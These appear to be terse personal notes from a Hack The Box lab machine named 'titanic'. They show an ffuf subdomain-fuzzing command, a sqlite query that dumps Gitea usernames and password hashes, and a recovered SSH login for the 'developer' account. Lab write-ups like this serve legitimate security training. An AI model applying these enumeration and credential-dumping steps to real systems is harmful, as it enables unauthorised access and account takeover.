ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
-u http://FUZZ.titanic.htb \  
-H "Host: FUZZ.titanic.htb" \  
-t 200 -fs 4242  







![[Pasted image 20250519124221.png]]
Subdominio Gitea 




sqlite> SELECT name, passwd FROM user;
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136
developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56
00000000|f24e471d94691876adc79fff644f0db3eb2a034fd805bb5cde994f064fdc7657ba74b926ad9d76c7c400e0d937ccc00066da
ramon|2b1a4dac973de07aafc71db405072abb656045d125a07b4b735e0015e7c6d81c2424b149e13e0ea59611c2427e2848f5c64b
yasscoder|9228f957f72e3df17440bf49b41406a9e74a79b6f9962b9f192570f1cb3074feeb6eaf5c06461ea77f5a4c1f5c0fe99e6e7c
sqlite> 

ramonpruebahash
ramon123

ssh developer:25282528